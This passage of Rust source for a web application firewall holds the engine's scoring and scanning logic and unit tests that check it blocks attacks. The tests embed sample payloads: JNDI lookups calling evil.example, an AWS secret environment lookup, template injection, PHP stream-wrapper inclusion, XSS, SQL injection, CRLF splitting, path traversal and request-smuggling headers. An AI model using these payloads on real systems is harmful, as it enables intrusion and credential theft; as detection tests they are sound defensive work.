/// contains, and CRLF-injection patterns match every body that uses CRLF line
/// endings — which is every multipart form.
#[derive(Clone, Copy)]
struct Filter {
    ssrf: bool,
    crlf: bool,
}

impl Filter {
    const ALL: Filter = Filter {
        ssrf: true,
        crlf: true,
    };
    const NO_SSRF: Filter = Filter {
        ssrf: false,
        crlf: true,
    };
    const BODY: Filter = Filter {
        ssrf: true,
        crlf: false,
    };

    fn allows(self, category: Category) -> bool {
        match category {
            Category::Ssrf => self.ssrf,
            Category::CrlfInjection => self.crlf,
            _ => true,
        }
    }
}

impl WafEngine {
    /// Inspect a request and return a WAF verdict.
    pub fn inspect(&self, req: &WafRequest<'_>) -> WafVerdict {
        self.stats.inspected.fetch_add(1, Ordering::Relaxed);

        let block_mode = req
            .mode_override
            .map_or(self.config.mode == "block", |m| m == "block");
        let threshold = self.config.anomaly_threshold.max(1);

        // Exclusions matching this path. Almost always empty, and when the
        // operator has configured none this costs a length check.
        let excluded: Vec<&CompiledExclusion> = if self.exclusions.is_empty() {
            Vec::new()
        } else {
            self.exclusions
                .iter()
                .filter(|e| e.path.is_match(req.path))
                .collect()
        };

        let mut a = Assessment::default();

        // --- Structural anomalies (smuggling, header injection) --------------
        if self.config.request_anomaly {
            self.check_anomalies(&mut a, req, &excluded, threshold);
        }

        // --- Scanner/reconnaissance probe paths ------------------------------
        // Path-only: the path itself is the signal, and matching these strings
        // in a query or body would fire on our own security documentation.
        if a.score < threshold {
            for set_idx in self.path_set.matches(req.path) {
                let idx = self.path_map[set_idx];
                if self.is_excluded(&excluded, idx) {
                    continue;
                }
                debug!("WAF scanner probe: {} on {}", self.rules[idx].id, req.path);
                if self.record(&mut a, idx, threshold) {
                    break;
                }
            }
        }

        // --- User-Agent ------------------------------------------------------
        if a.score < threshold && !req.skip_bot_ua_check && self.config.block_scanner_uas {
            self.check_user_agent(&mut a, req, &excluded, threshold);
        }

        // --- Path and query --------------------------------------------------
        if a.score < threshold {
            let target = if req.query.is_empty() {
                req.path.to_string()
            } else {
                format!("{}?{}", req.path, req.query)
            };
            self.scan_payload(
                &mut a,
                &target,
                &excluded,
                Filter::ALL,
                usize::MAX,
                threshold,
            );
        }

        // --- Headers ----------------------------------------------------------
        if a.score < threshold {
            self.scan_headers(&mut a, req, &excluded, threshold);
        }

        // --- Body -------------------------------------------------------------
        if a.score < threshold {
            if let Some(body) = req.body {
                let content_encoding = req
                    .headers
                    .get("content-encoding")
                    .and_then(|v| v.to_str().ok());
                self.scan_body(&mut a, body, content_encoding, &excluded, threshold);
            }
        }

        self.verdict(&a, block_mode, threshold, req)
    }

    /// Turn an assessment into a verdict, updating the verdict counters.
    fn verdict(
        &self,
        a: &Assessment,
        block_mode: bool,
        threshold: u32,
        req: &WafRequest<'_>,
    ) -> WafVerdict {
        let Some(idx) = a.top else {
            self.stats.allowed.fetch_add(1, Ordering::Relaxed);
            return WafVerdict::Allow;
        };

        let rule_meta = &self.rules[idx];
        // Keep the historical `category:identifier` shape so operator log
        // filters written against the old engine still select the same lines.
        let rule = format!("{}:{}", rule_meta.category.as_str(), rule_meta.id);
        let severity = rule_meta.severity;

        if a.score < threshold {
            // Matched, but not enough corroboration to act on. Recorded in the
            // per-rule counters so a rule that only ever contributes below
            // threshold is visible for tuning, but the request is served.
            debug!(
                "WAF below threshold: rule={} score={}/{} path={}",
                rule, a.score, threshold, req.path
            );
            self.stats.allowed.fetch_add(1, Ordering::Relaxed);
            return WafVerdict::Allow;
        }

        if block_mode {
            self.stats.blocked.fetch_add(1, Ordering::Relaxed);
            WafVerdict::Block {
                rule,
                severity,
                score: a.score,
                matched: a.matched,
            }
        } else {
            self.stats.detected.fetch_add(1, Ordering::Relaxed);
            WafVerdict::Detect {
                rule,
                severity,
                score: a.score,
                matched: a.matched,
            }
        }
    }

    /// Count one rule match. Returns true once the assessment has reached the
    /// blocking threshold, so callers can stop scanning.
    fn record(&self, a: &mut Assessment, idx: usize, threshold: u32) -> bool {
        // A rule that matches in several decoded forms of the same input is one
        // finding, not several; counting it twice would let a single pattern
        // reach a threshold meant to require corroboration.
        if a.seen.contains(&idx) {
            return a.score >= threshold;
        }
        a.seen.push(idx);

        if let Some(counter) = self.stats.per_rule.get(idx) {
            counter.fetch_add(1, Ordering::Relaxed);
        }

        let rule = &self.rules[idx];
        a.score = a.score.saturating_add(rule.severity.score());
        a.matched += 1;
        if a.top_severity.is_none_or(|s| rule.severity > s) {
            a.top = Some(idx);
            a.top_severity = Some(rule.severity);
        }
        a.score >= threshold
    }

    fn is_excluded(&self, excluded: &[&CompiledExclusion], idx: usize) -> bool {
        if excluded.is_empty() {
            return false;
        }
        let rule = &self.rules[idx];
        excluded.iter().any(|e| {
            e.rules.iter().any(|r| r == &rule.id)
                || e.categories
                    .iter()
                    .any(|c| c.eq_ignore_ascii_case(rule.category.as_str()))
        })
    }

    /// Scan one input, and every decoded form of it, against the payload rules.
    fn scan_payload(
        &self,
        a: &mut Assessment,
        raw: &str,
        excluded: &[&CompiledExclusion],
        filter: Filter,
        max_bytes: usize,
        threshold: u32,
    ) -> bool {
        if raw.is_empty() || self.payload_set.is_empty() {
            return false;
        }
        let input = truncate_on_char_boundary(raw, max_bytes);
        for variant in decode_variants(input, self.config.max_decode_passes) {
            for set_idx in self.payload_set.matches(&variant) {
                let idx = self.payload_map[set_idx];
                if !filter.allows(self.rules[idx].category) || self.is_excluded(excluded, idx) {
                    continue;
                }
                if self.record(a, idx, threshold) {
                    return true;
                }
            }
        }
        false
    }

    /// Apply the User-Agent rules, including the presence checks.
    fn check_user_agent(
        &self,
        a: &mut Assessment,
        req: &WafRequest<'_>,
        excluded: &[&CompiledExclusion],
        threshold: u32,
    ) {
        // Protocol probes (HTTP/3 checkers, uptime monitors, Alt-Svc validators)
        // send `HEAD /` with no User-Agent and were wrongly caught by the
        // missing-UA rule, which made third-party HTTP/3 checkers report this
        // server as not supporting QUIC. A HEAD on the root path returns headers
        // only — no body, no data exposed, nothing an attacker can act on — so
        // exempting exactly that one shape restores protocol discoverability
        // without loosening the rule for the scanning traffic it exists to stop
        // (which targets specific paths with GET/POST).
        let is_root_protocol_probe = req.method.eq_ignore_ascii_case("HEAD") && req.path == "/";

        let ua = req.headers.get("user-agent").and_then(|v| v.to_str().ok());

        match ua {
            // No User-Agent header at all.
            None => {
                if !is_root_protocol_probe {
                    let idx = self.ua_meta_base;
                    if !self.is_excluded(excluded, idx) {
                        debug!("WAF blocked missing User-Agent");
                        self.record(a, idx, threshold);
                    }
                }
            }
            // Header present but blank — `curl -H 'User-Agent:'` sends Some("").
            Some(v) if v.trim().is_empty() => {
                if !is_root_protocol_probe {
                    let idx = self.ua_meta_base + 1;
                    if !self.is_excluded(excluded, idx) {
                        debug!("WAF blocked empty User-Agent");
                        self.record(a, idx, threshold);
                    }
                }
            }
            Some(v) => {
                for set_idx in self.ua_set.matches(v) {
                    let idx = self.ua_map[set_idx];
                    if self.is_excluded(excluded, idx) {
                        continue;
                    }
                    debug!("WAF scanner UA {}: {}", self.rules[idx].id, v);
                    if self.record(a, idx, threshold) {
                        return;
                    }
                }
            }
        }
    }

    /// Scan request headers.
    ///
    /// Every header is scanned except an explicit skip list. The engine used to
    /// scan four — user-agent, referer, cookie and x-forwarded-for — while its
    /// own comment claimed it covered `X-*` headers, so a payload in `Origin`,
    /// `X-Forwarded-Host` or any custom header reached the origin uninspected.
    fn scan_headers(
        &self,
        a: &mut Assessment,
        req: &WafRequest<'_>,
        excluded: &[&CompiledExclusion],
        threshold: u32,
    ) {
        if !self.config.scan_all_headers {
            return;
        }
        for (name, value) in req.headers.iter() {
            let name_str = name.as_str();
            if HEADERS_NEVER_SCANNED.contains(&name_str) {
                continue;
            }
            let Ok(v) = value.to_str() else {
                continue;
            };
            let filter = if HEADERS_SSRF_EXEMPT.contains(&name_str) {
                Filter::NO_SSRF
            } else {
                Filter::ALL
            };
            if self.scan_payload(
                a,
                v,
                excluded,
                filter,
                self.config.max_header_scan_bytes,
                threshold,
            ) {
                debug!("WAF hit on header {}", name_str);
                return;
            }
        }
    }

    /// Scan a buffered request body.
    ///
    /// Decoding is lossy on purpose. The previous implementation used
    /// `std::str::from_utf8` on a slice cut at `max_body_scan_bytes`: a
    /// multi-byte character straddling that cut made the conversion fail and the
    /// **entire body** went uninspected, and any body that was not valid UTF-8
    /// was never inspected at all.
    fn scan_body(
        &self,
        a: &mut Assessment,
        body: &[u8],
        content_encoding: Option<&str>,
        excluded: &[&CompiledExclusion],
        threshold: u32,
    ) {
        if body.is_empty() {
            return;
        }

        // If the body is compression-encoded, decompress first and treat the
        // decompressed bytes as the thing to inspect as text. Scanning the raw
        // compressed bytes as text is not just useless (a gzipped `<script>` is
        // entropy) — it is a false-positive source: a DEFLATE stream contains
        // stray NULs and control bytes that trip binary-ish rules such as the
        // null-byte traversal rule. So: byte-signatures always run on the raw
        // bytes (they look for exact binary headers, unaffected by entropy),
        // but the text scan runs on the decompressed form when there is one,
        // and on the raw form otherwise.
        let decompressed = content_encoding
            .filter(|_| self.config.decode_compressed_body)
            .and_then(|enc| {
                decompress_bounded(body, enc, self.config.max_decompressed_body_bytes)
                    .filter(|d| !d.is_empty() && d.as_slice() != body)
            });

        // 1. Binary signatures on the raw bytes (Java/pickle headers).
        if self.scan_body_signatures(a, body, excluded, threshold) {
            return;
        }

        // 2. Text scan — on the decompressed body if we have one, else the raw.
        let text_target: &[u8] = decompressed.as_deref().unwrap_or(body);
        if let Some(enc) = content_encoding {
            if decompressed.is_some() {
                debug!(
                    "WAF scanning decompressed body ({} bytes, enc={})",
                    text_target.len(),
                    enc
                );
            }
        }
        self.scan_body_text(a, text_target, excluded, threshold);
    }

    /// Binary signature scan (exact byte headers) on a raw body slice.
    fn scan_body_signatures(
        &self,
        a: &mut Assessment,
        body: &[u8],
        excluded: &[&CompiledExclusion],
        threshold: u32,
    ) -> bool {
        if !self.config.deserialization {
            return false;
        }
        let limited = &body[..body.len().min(self.config.max_body_scan_bytes)];
        for (n, (_, _, needle)) in BYTE_SIGNATURES.iter().enumerate() {
            let idx = self.byte_sig_base + n;
            if self.is_excluded(excluded, idx) {
                continue;
            }
            if limited.windows(needle.len()).any(|w| w == *needle) {
                debug!("WAF body byte signature {}", self.rules[idx].id);
                if self.record(a, idx, threshold) {
                    return true;
                }
            }
        }
        false
    }

    /// Text (regex) scan on a raw-or-decompressed body slice.
    fn scan_body_text(
        &self,
        a: &mut Assessment,
        body: &[u8],
        excluded: &[&CompiledExclusion],
        threshold: u32,
    ) {
        if !self.config.scan_json_body {
            return;
        }
        let limited = &body[..body.len().min(self.config.max_body_scan_bytes)];
        let text = String::from_utf8_lossy(limited);
        if self.scan_payload(
            a,
            &text,
            excluded,
            Filter::BODY,
            self.config.max_body_scan_bytes,
            threshold,
        ) {
            debug!("WAF hit in request body");
        }
    }

    /// Structural request anomalies that no regex can express.
    fn check_anomalies(
        &self,
        a: &mut Assessment,
        req: &WafRequest<'_>,
        excluded: &[&CompiledExclusion],
        threshold: u32,
    ) {
        let hit = |n: usize, a: &mut Assessment| -> bool {
            let idx = self.anomaly_base + n;
            if self.is_excluded(excluded, idx) {
                return false;
            }
            debug!(
                "WAF request anomaly {}: {}",
                ANOMALY_RULES[n].0, ANOMALY_RULES[n].2
            );
            self.record(a, idx, threshold)
        };

        // Request smuggling: a second Content-Length, or Content-Length beside
        // Transfer-Encoding, means two parsers in the chain can disagree about
        // where this request ends.
        let cls: Vec<&str> = req
            .headers
            .get_all("content-length")
            .iter()
            .filter_map(|v| v.to_str().ok())
            .collect();
        if cls.len() > 1 && cls.iter().any(|v| v.trim() != cls[0].trim()) && hit(0, a) {
            return;
        }

        let tes: Vec<&str> = req
            .headers
            .get_all("transfer-encoding")
            .iter()
            .filter_map(|v| v.to_str().ok())
            .collect();
        if !tes.is_empty() && !cls.is_empty() && hit(1, a) {
            return;
        }
        // "chunked" is the only transfer coding this proxy speaks. Anything
        // else — a list, padding, a different case-folded spelling with
        // trailing junk — is an attempt to have one hop honour it and another
        // ignore it.
        if (tes.len() > 1
            || tes
                .iter()
                .any(|v| !v.trim().eq_ignore_ascii_case("chunked")))
            && hit(2, a)
        {
            return;
        }

        // Control characters in a header value split the header block for any
        // downstream parser that is more permissive than this one.
        if req.headers.values().any(|v| {
            v.as_bytes()
                .iter()
                .any(|&b| (b < 0x20 && b != b'\t') || b == 0x7f)
        }) && hit(3, a)
        {
            return;
        }

        // Diagnostic methods reflect the request back and are never needed here.
        if matches!(
            req.method.to_ascii_uppercase().as_str(),
            "TRACE" | "TRACK" | "DEBUG"
        ) && hit(4, a)
        {
            return;
        }

        if req.headers.len() > self.config.max_header_count && hit(5, a) {
            return;
        }

        let hosts: Vec<&str> = req
            .headers
            .get_all("host")
            .iter()
            .filter_map(|v| v.to_str().ok())
            .collect();
        // A Host containing a space, slash or userinfo marker is an attempt at
        // routing or cache confusion, not a hostname.
        if hosts
            .iter()
            .any(|h| h.contains(['/', ' ', '\t', '@', '\\']))
            && hit(6, a)
        {
            return;
        }
        if hosts.len() > 1 {
            hit(7, a);
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::WafExclusion;
    use axum::http::HeaderMap;

    fn config() -> WafConfig {
        WafConfig {
            enabled: true,
            block_scanner_uas: true,
            ..Default::default()
        }
    }

    fn engine() -> WafEngine {
        WafEngine::new(&config())
    }

    fn req<'a>(method: &'a str, path: &'a str, headers: &'a HeaderMap) -> WafRequest<'a> {
        WafRequest {
            method,
            path,
            query: "",
            headers,
            body: None,
            skip_bot_ua_check: false,
            mode_override: None,
        }
    }

    /// A request shaped like a real browser's, used to prove the added header
    /// and body coverage did not turn ordinary traffic into 403s.
    fn browser_headers() -> HeaderMap {
        let mut h = HeaderMap::new();
        h.insert("user-agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36".parse().unwrap());
        h.insert(
            "accept",
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
                .parse()
                .unwrap(),
        );
        h.insert("accept-language", "en-US,en;q=0.9".parse().unwrap());
        h.insert(
            "accept-encoding",
            "gzip, deflate, br, zstd".parse().unwrap(),
        );
        h.insert("referer", "https://pqcrypta.com/pqcproxy/".parse().unwrap());
        h.insert("origin", "https://pqcrypta.com".parse().unwrap());
        h.insert("cookie", "session=6f1b2c9a4e; consent=1".parse().unwrap());
        h.insert("host", "pqcrypta.com".parse().unwrap());
        h.insert("sec-fetch-mode", "navigate".parse().unwrap());
        h.insert("x-forwarded-for", "203.0.113.9, 127.0.0.1".parse().unwrap());
        h
    }

    fn blocked(v: &WafVerdict) -> bool {
        matches!(v, WafVerdict::Block { .. })
    }

    fn rule_of(v: &WafVerdict) -> String {
        match v {
            WafVerdict::Block { rule, .. } | WafVerdict::Detect { rule, .. } => rule.clone(),
            WafVerdict::Allow => String::from("<allow>"),
        }
    }

    // ------------------------------------------------------------------
    // Protocol-probe exemption (pre-existing behaviour, kept)
    // ------------------------------------------------------------------

    /// HTTP/3 checkers probe with `HEAD /` and no User-Agent. Blocking that
    /// made third-party tools report this server as not supporting QUIC.
    #[test]
    fn head_root_without_user_agent_is_allowed() {
        let headers = HeaderMap::new();
        assert!(
            matches!(
                engine().inspect(&req("HEAD", "/", &headers)),
                WafVerdict::Allow
            ),
            "HEAD / with no User-Agent must not be blocked (breaks protocol checkers)"
        );
    }

    /// The exemption is deliberately narrow: only the root path, only HEAD.
    #[test]
    fn missing_user_agent_still_blocked_elsewhere() {
        let headers = HeaderMap::new();
        assert!(
            blocked(&engine().inspect(&req("GET", "/", &headers))),
            "GET / with no User-Agent must still be blocked"
        );
        assert!(
            blocked(&engine().inspect(&req("HEAD", "/admin", &headers))),
            "HEAD on a non-root path with no User-Agent must still be blocked"
        );
    }

    /// The exemption must not extend to known-bad scanner user-agents.
    #[test]
    fn known_bad_ua_still_blocked_on_head_root() {
        let mut headers = HeaderMap::new();
        headers.insert("user-agent", "sqlmap/1.7".parse().unwrap());
        assert!(
            blocked(&engine().inspect(&req("HEAD", "/", &headers))),
            "a known scanner UA must still be blocked even on HEAD /"
        );
    }

    // ------------------------------------------------------------------
    // Ordinary traffic must survive the widened coverage
    // ------------------------------------------------------------------

    #[test]
    fn normal_browser_request_is_allowed() {
        let headers = browser_headers();
        let v = engine().inspect(&WafRequest {
            method: "GET",
            path: "/pqcproxy/index.php",
            query: "tab=waf&page=2",
            headers: &headers,
            body: None,
            skip_bot_ua_check: false,
            mode_override: None,
        });
        assert!(
            matches!(v, WafVerdict::Allow),
            "ordinary browser request must pass, got {}",
            rule_of(&v)
        );
    }

    /// X-Forwarded-For carries loopback and private addresses by design. With
    /// SSRF rules on, they must not be read as an SSRF attempt.
    #[test]
    fn proxy_hop_headers_are_exempt_from_ssrf_rules() {
        let mut cfg = config();
        cfg.ssrf = true;
        let engine = WafEngine::new(&cfg);
        let mut headers = browser_headers();
        headers.insert("x-real-ip", "127.0.0.1".parse().unwrap());
        headers.insert("via", "1.1 localhost".parse().unwrap());
        let v = engine.inspect(&req("GET", "/status", &headers));
        assert!(
            matches!(v, WafVerdict::Allow),
            "proxy hop headers must not trigger SSRF rules, got {}",
            rule_of(&v)
        );
    }

    /// A form body with CRLF line endings is every multipart upload. The CRLF
    /// rules exist for URLs and headers and must not see the body.
    #[test]
    fn crlf_line_endings_in_body_are_not_response_splitting() {
        let headers = browser_headers();
        let body = b"--boundary\r\nContent-Disposition: form-data; name=\"note\"\r\n\r\nhello\r\n--boundary--\r\n";
        let v = engine().inspect(&WafRequest {
            method: "POST",
            path: "/contact",
            query: "",
            headers: &headers,
            body: Some(body),
            skip_bot_ua_check: false,
            mode_override: None,
        });
        assert!(
            matches!(v, WafVerdict::Allow),
            "a multipart body must not be read as response splitting, got {}",
            rule_of(&v)
        );
    }

    // ------------------------------------------------------------------
    // Closed bypasses
    // ------------------------------------------------------------------

    /// One decode pass left `%253Cscript%253E` looking like `%3Cscript%3E`,
    /// which matches nothing — while the origin decoded it the rest of the way.
    #[test]
    fn double_url_encoding_is_decoded() {
        let headers = browser_headers();
        let v = engine().inspect(&WafRequest {
            method: "GET",
            path: "/search",
            query: "q=%253Cscript%253Ealert(1)%253C/script%253E",
            headers: &headers,
            body: None,
            skip_bot_ua_check: false,
            mode_override: None,
        });
        assert!(blocked(&v), "double-encoded XSS must be blocked");
    }

    /// A body cut mid-character made `from_utf8` fail, and the whole body went
    /// uninspected.
    #[test]
    fn body_truncated_mid_character_is_still_scanned() {
        let mut cfg = config();
        cfg.max_body_scan_bytes = 16;
        let engine = WafEngine::new(&cfg);
        let headers = browser_headers();
        // "€" is three bytes; place it so byte 16 lands inside it.
        let mut body = Vec::from("<script>x</s€cript>".as_bytes());
        body.extend_from_slice(&[0xff, 0xfe]);
        let v = engine.inspect(&WafRequest {
            method: "POST",
            path: "/submit",
            query: "",
            headers: &headers,
            body: Some(&body),
            skip_bot_ua_check: false,
            mode_override: None,
        });
        assert!(
            blocked(&v),
            "a body cut mid-character must still be inspected"
        );
    }

    /// A body that is not valid UTF-8 at all was never inspected.
    #[test]
    fn binary_body_is_scanned() {
        let headers = browser_headers();
        let mut body = vec![0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0xff, 0xd8];
        body.extend_from_slice(b"'; DROP TABLE users--");
        let v = engine().inspect(&WafRequest {
            method: "POST",
            path: "/upload",
            query: "",
            headers: &headers,
            body: Some(&body),
            skip_bot_ua_check: false,
            mode_override: None,
        });
        assert!(blocked(&v), "a non-UTF-8 body must still be inspected");
    }

    /// The Java serialisation header is binary, so the regex rule for it could
    /// never fire against a decoded body.
    #[test]
    fn java_serialised_object_body_is_detected() {
        let headers = browser_headers();
        let mut body = vec![0xac, 0xed, 0x00, 0x05, 0x73, 0x72, 0x00, 0x11];
        body.extend_from_slice(&[0x00; 32]);
        let v = engine().inspect(&WafRequest {
            method: "POST",
            path: "/api/import",
            query: "",
            headers: &headers,
            body: Some(&body),
            skip_bot_ua_check: false,
            mode_override: None,
        });
        assert!(blocked(&v), "Java serialised object body must be blocked");
        assert!(
            rule_of(&v).contains("PQW-DESER-100"),
            "expected the byte-signature rule, got {}",
            rule_of(&v)
        );
    }

    /// `scan_json_body` meant "scan the body as text": a JSON unicode escape
    /// arrived at the origin as the character it encodes.
    #[test]
    fn json_unicode_escapes_are_decoded() {
        let headers = browser_headers();
        let body = br#"{"comment":"\u003cscript\u003ealert(1)\u003c/script\u003e"}"#;
        let v = engine().inspect(&WafRequest {
            method: "POST",
            path: "/api/comment",
            query: "",
            headers: &headers,
            body: Some(body),
            skip_bot_ua_check: false,
            mode_override: None,
        });
        assert!(blocked(&v), "JSON-escaped XSS in a body must be blocked");
    }

    /// Only four headers were scanned, so any other header was a free channel.
    #[test]
    fn payload_in_an_unscanned_header_is_caught() {
        for header in ["origin", "x-forwarded-host", "x-original-url", "x-custom"] {
            let mut headers = browser_headers();
            headers.insert(
                header,
                "' UNION SELECT password FROM users--".parse().unwrap(),
            );
            let v = engine().inspect(&req("GET", "/", &headers));
            assert!(blocked(&v), "SQLi in the {header} header must be blocked");
        }
    }

    /// HTML character references are the other common encoding for a reflected
    /// payload.
    #[test]
    fn html_entity_encoded_payload_is_decoded() {
        let headers = browser_headers();
        let v = engine().inspect(&WafRequest {
            method: "GET",
            path: "/search",
            query: "q=&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;",
            headers: &headers,
            body: None,
            skip_bot_ua_check: false,
            mode_override: None,
        });
        assert!(blocked(&v), "entity-encoded XSS must be blocked");
    }

    // ------------------------------------------------------------------
    // New detection categories
    // ------------------------------------------------------------------

    #[test]
    fn jndi_lookup_injection_is_blocked() {
        for payload in [
            "${jndi:ldap://evil.example/a}",
            "${${lower:j}ndi:rmi://evil.example/a}",
            "${env:AWS_SECRET_ACCESS_KEY}",
        ] {
            let mut headers = browser_headers();
            headers.insert("x-api-version", payload.parse().unwrap());
            let v = engine().inspect(&req("GET", "/", &headers));
            assert!(blocked(&v), "JNDI payload {payload:?} must be blocked");
        }
    }

    #[test]
    fn template_injection_is_blocked() {
        let headers = browser_headers();
        for query in [
            "name={{7*7}}",
            "name={{config.items()}}",
            "name={{''.__class__.__mro__}}",
        ] {
            let v = engine().inspect(&WafRequest {
                method: "GET",
                path: "/greet",
                query,
                headers: &headers,
                body: None,
                skip_bot_ua_check: false,
                mode_override: None,
            });
            assert!(blocked(&v), "SSTI payload {query:?} must be blocked");
        }
    }

    #[test]
    fn stream_wrapper_file_inclusion_is_blocked() {
        let headers = browser_headers();
        for query in [
            "page=php://filter/convert.base64-encode/resource=index",
            "page=expect://id",
            "page=data://text/plain;base64,PD9waHA=",
        ] {
            let v = engine().inspect(&WafRequest {
                method: "GET",
                path: "/view",
                query,
                headers: &headers,
                body: None,
                skip_bot_ua_check: false,
                mode_override: None,
            });
            assert!(blocked(&v), "LFI payload {query:?} must be blocked");
        }
    }

    #[test]
    fn prototype_pollution_is_blocked() {
        let headers = browser_headers();
        let body = br#"{"__proto__":{"isAdmin":true}}"#;
        let v = engine().inspect(&WafRequest {
            method: "POST",
            path: "/api/profile",
            query: "",
            headers: &headers,
            body: Some(body),
            skip_bot_ua_check: false,
            mode_override: None,
        });
        assert!(blocked(&v), "prototype pollution must be blocked");
    }

    #[test]
    fn crlf_response_splitting_in_query_is_blocked() {
        let headers = browser_headers();
        let v = engine().inspect(&WafRequest {
            method: "GET",
            path: "/redirect",
            query: "next=/home%0d%0aSet-Cookie:%20admin=1",
            headers: &headers,
            body: None,
            skip_bot_ua_check: false,
            mode_override: None,
        });
        assert!(blocked(&v), "CRLF response splitting must be blocked");
    }

    #[test]
    fn path_confusion_traversal_is_blocked() {
        let headers = browser_headers();
        for path in [
            "/static/..;/WEB-INF/web.xml",
            "/files/%c0%af%c0%afetc/passwd",
        ] {
            let v = engine().inspect(&req("GET", path, &headers));
            assert!(blocked(&v), "path confusion {path:?} must be blocked");
        }
    }

    // ------------------------------------------------------------------
    // Structural anomalies
    // ------------------------------------------------------------------

    #[test]
    fn content_length_with_transfer_encoding_is_blocked() {
        let mut headers = browser_headers();
        headers.insert("content-length", "42".parse().unwrap());
        headers.insert("transfer-encoding", "chunked".parse().unwrap());
        let v = engine().inspect(&req("POST", "/api/data", &headers));
        assert!(blocked(&v), "CL+TE request smuggling must be blocked");
        assert!(rule_of(&v).contains("PQW-ANOM-002"), "got {}", rule_of(&v));
    }

    #[test]
    fn conflicting_content_length_headers_are_blocked() {
        let mut headers = browser_headers();
        headers.append("content-length", "42".parse().unwrap());
        headers.append("content-length", "0".parse().unwrap());
        let v = engine().inspect(&req("POST", "/api/data", &headers));
        assert!(blocked(&v), "conflicting Content-Length must be blocked");
        assert!(rule_of(&v).contains("PQW-ANOM-001"), "got {}", rule_of(&v));
    }

    #[test]
    fn obfuscated_transfer_encoding_is_blocked() {
        let mut headers = browser_headers();
        headers.insert("transfer-encoding", "chunked, identity".parse().unwrap());
        let v = engine().inspect(&req("POST", "/api/data", &headers));
        assert!(
            blocked(&v),
            "a non-chunked Transfer-Encoding must be blocked"
        );
    }

    #[test]
    fn diagnostic_methods_are_blocked() {
        let headers = browser_headers();
        assert!(blocked(&engine().inspect(&req("TRACE", "/", &headers))));
        assert!(blocked(&engine().inspect(&req("TRACK", "/", &headers))));
    }

    #[test]
    fn malformed_host_header_is_blocked() {
        let mut headers = browser_headers();
        headers.insert("host", "pqcrypta.com/evil.example".parse().unwrap());
        let v = engine().inspect(&req("GET", "/", &headers));
        assert!(blocked(&v), "a Host containing a path must be blocked");
    }

    // ------------------------------------------------------------------
    // Scoring
    // ------------------------------------------------------------------

    /// The whole point of scoring: one weak signal is not a 403. "localhost"
    /// in a query string used to be one on its own.
    #[test]
    fn a_single_low_severity_signal_does_not_block() {
        let mut cfg = config();
        cfg.ssrf = true;
        let engine = WafEngine::new(&cfg);
        let headers = browser_headers();
        let v = engine.inspect(&WafRequest {
            method: "GET",
            path: "/docs/setup",
            query: "example=http://localhost:3000/callback",
            headers: &headers,
            body: None,
            skip_bot_ua_check: false,
            mode_override: None,
        });
        assert!(
            matches!(v, WafVerdict::Allow),
            "one Low-severity match must not block, got {}",
            rule_of(&v)
        );
    }

    /// Two independent weak signals do reach the threshold.
    #[test]
    fn corroborating_low_severity_signals_block() {
        let mut cfg = config();
        cfg.ssrf = true;
        let engine = WafEngine::new(&cfg);
        let headers = browser_headers();
        let v = engine.inspect(&WafRequest {
            method: "GET",
            path: "/fetch",
            query: "url=http://localhost/&cmd=$(id)",
            headers: &headers,
            body: None,
            skip_bot_ua_check: false,
            mode_override: None,
        });
        assert!(
            blocked(&v),
            "two Low-severity matches must reach the threshold"
        );
    }

    /// A high threshold is the tuning knob: the same request that blocks at the
    /// default passes when the operator demands more corroboration.
    #[test]
    fn raising_the_threshold_suppresses_single_rule_blocks() {
        let mut cfg = config();
        cfg.anomaly_threshold = 20;
        let engine = WafEngine::new(&cfg);
        let headers = browser_headers();
        let v = engine.inspect(&WafRequest {
            method: "GET",
            path: "/search",
            query: "q=<script>alert(1)</script>",
            headers: &headers,
            body: None,
            skip_bot_ua_check: false,
            mode_override: None,
        });
        assert!(
            matches!(v, WafVerdict::Allow),
            "threshold 20 must not be reached by one Medium rule, got {}",
            rule_of(&v)
        );
    }

    /// One rule matching in several decoded forms of the same input is one
    /// finding — otherwise a single pattern could clear a threshold that exists
    /// to require corroboration.
    #[test]
    fn one_rule_matching_several_variants_scores_once() {
        let mut cfg = config();
        cfg.ssrf = true;
        cfg.anomaly_threshold = 4;
        let engine = WafEngine::new(&cfg);
        let headers = browser_headers();
        // "localhost" appears raw and survives every decode pass, so it matches
        // PQW-SSRF-012 in each variant.
        let v = engine.inspect(&WafRequest {
            method: "GET",
            path: "/docs",
            query: "a=localhost%20localhost",
            headers: &headers,
            body: None,
            skip_bot_ua_check: false,
            mode_override: None,
        });
        assert!(
            matches!(v, WafVerdict::Allow),
            "a single Low rule scores 2 however many variants it matches, got {}",
            rule_of(&v)
        );
    }

    // ------------------------------------------------------------------
    // Modes, exclusions, identifiers, counters
    // ------------------------------------------------------------------

    #[test]
    fn detect_mode_reports_without_blocking() {
        let mut cfg = config();
        cfg.mode = "detect".to_string();
        let engine = WafEngine::new(&cfg);
        let headers = browser_headers();
        let v = engine.inspect(&WafRequest {
            method: "GET",
            path: "/search",
            query: "q=<script>alert(1)</script>",
            headers: &headers,
            body: None,
            skip_bot_ua_check: false,
            mode_override: None,
        });
        assert!(matches!(v, WafVerdict::Detect { .. }), "expected Detect");
    }

    #[test]
    fn route_mode_override_wins_over_global_mode() {
        let headers = browser_headers();
        let v = engine().inspect(&WafRequest {
            method: "GET",
            path: "/search",
            query: "q=<script>alert(1)</script>",
            headers: &headers,
            body: None,
            skip_bot_ua_check: false,
            mode_override: Some("detect"),
        });
        assert!(matches!(v, WafVerdict::Detect { .. }));
    }

    /// Tuning a false positive used to mean switching a whole category off for
    /// the entire site.
    #[test]
    fn exclusions_suppress_a_rule_on_one_path_only() {
        let mut cfg = config();
        cfg.exclusions = vec![WafExclusion {
            path: "^/api/graphql".to_string(),
            rules: vec!["PQW-NOSQL-001".to_string()],
            categories: Vec::new(),
        }];
        let engine = WafEngine::new(&cfg);
        let headers = browser_headers();
        let query = "filter[$ne]=1";

        let excluded = engine.inspect(&WafRequest {
            method: "POST",
            path: "/api/graphql",
            query,
            headers: &headers,
            body: None,
            skip_bot_ua_check: false,
            mode_override: None,
        });
        assert!(
            matches!(excluded, WafVerdict::Allow),
            "the excluded rule must not fire on the excluded path, got {}",
            rule_of(&excluded)
        );

